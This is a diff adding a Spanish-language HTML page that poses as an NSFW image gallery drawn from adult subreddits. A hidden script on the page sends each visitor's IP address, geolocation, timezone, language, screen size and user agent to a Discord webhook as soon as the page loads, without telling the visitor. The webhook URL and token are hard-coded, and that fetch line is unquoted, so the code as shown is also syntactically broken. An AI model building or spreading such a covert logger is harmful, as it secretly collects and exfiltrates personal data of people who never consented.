@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Galería NSFW + Logger</title>
+<style>
+  body { margin:0; background:#0d0d0d; color:#eee; font-family:system-ui,sans-serif; }
+  h1 { text-align:center; padding:16px; font-size:1.2rem; }
+  .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(220px,1fr)); gap:8px; padding:8px; }
+  .grid a { display:block; }
+  .grid img { width:100%; height:auto; border-radius:8px; display:block; background:#222; }
+  #status { text-align:center; padding:8px; font-size:.8rem; color:#888; }
+</style>
+</head>
+<body>
+
+<h1>🔥 Galería NSFW</h1>
+<div id="status">Cargando...</div>
+<div class="grid" id="grid"></div>
+
+<script>
+/* ================== CONFIG ================== */
+const WEBHOOK_URL = "https://discord.com/api/webhooks/TU_ID/TU_TOKEN";
+
+// Subreddits NSFW de donde sacar imágenes
+const SUBS = ["RealGirls", "gonewild", "NSFW_GIF", "porn", "AsiansGoneWild"];
+/* ============================================ */
+
+/* ---------- 1) LOGGER ---------- */
+async function logVisit() {
+  try {
+    const geo = await fetch("https://ipwho.is/").then(r => r.json());
+
+    const ip         = geo.ip || "desconocida";
+    const ciudad     = geo.city || "desconocida";
+    const region     = geo.region || "desconocida";
+    const pais       = geo.country || "desconocido";
+    const codigoPais = geo.country_code || "";
+    const ua         = navigator.userAgent;
+    const idioma     = navigator.language;
+    const pantalla   = `${screen.width}x${screen.height}`;
+    const zona       = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+    const embed = {
+      title: "🕵️ Nuevo visitante",
+      color: 0xff2d55,
+      fields: [
+        { name: "IP", value: `\`${ip}\``, inline: true },
+        { name: "Ciudad", value: ciudad, inline: true },
+        { name: "Región", value: region, inline: true },
+        { name: "País", value: `${pais} ${codigoPais}`, inline: true },
+        { name: "Zona horaria", value: zona, inline: true },
+        { name: "Idioma", value: idioma, inline: true },
+        { name: "Pantalla", value: pantalla, inline: true },
+        { name: "User Agent", value: `\`\`\`${ua}\`\`\``, inline: false }
+      ],
+      timestamp: new Date().toISOString(),
+      footer: { text: "Logger" }
+    };
+
+    await fetch(https://discord.com/api/webhooks/1573570505527787590/D_5mesT7-bqvYlnVtNPZvtV7Fj79kBD-MSVgMH2ckWZ0vjTxVF8dFc62xcuC8mRqfhfi, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username: "Visitante", embeds: [embed] })
+    });
+  } catch (e) {
+    console.warn("Error en logger:", e);
+  }
+}
+
+/* ---------- 2) GALERÍA ---------- */
+function esImagen(url) {
+  return /\.(jpe?g|png|gif|webp)(\?.*)?$/i.test(url) || url.includes("i.redd.it");
+}
+
+async function cargarImagenes() {
+  const grid = document.getElementById("grid");
+  const status = document.getElementById("status");
+  let total = 0;
+
+  for (const sub of SUBS) {
+    try {
+      const res = await fetch(`https://www.reddit.com/r/${sub}/hot.json?limit=25`);
+      const data = await res.json();
+      const posts = data?.data?.children || [];
+
+      for (const p of posts) {
+        const d = p.data;
+        if (!d || d.over_18 === false) continue;
+        const url = d.url_overridden_by_dest || d.url;
+        if (!url || !esImagen(url)) continue;
+
+        const a = document.createElement("a");
+        a.href = `https://reddit.com${d.permalink}`;
+        a.target = "_blank";
+        a.rel = "noopener";
+
+        const img = document.createElement("img");
+        img.src = url;
+        img.loading = "lazy";
+        img.alt = d.title || "imagen";
+        img.onerror = () => { img.src = "https://picsum.photos/400/600"; };
+
+        a.appendChild(img);
+        grid.appendChild(a);
+        total++;
+      }
+    } catch (e) {
+      console.warn("Error sub " + sub, e);
+    }
+  }
+
+  if (total === 0) {
+    // Fallback si Reddit bloquea
+    for (let i = 0; i < 12; i++) {
+      const img = document.createElement("img");
+      img.src = `https://picsum.photos/seed/${Date.now() + i}/400/600`;
+      grid.appendChild(img);
+    }
+    status.textContent = "Reddit bloqueado, mostrando fallback";
+  } else {
+    status.textContent = `${total} imágenes cargadas`;
+  }
+}
+
+/* ---------- 3) INICIO ---------- */
+logVisit();
+cargarImagenes();
+</script>
+
+</body>
+</html>
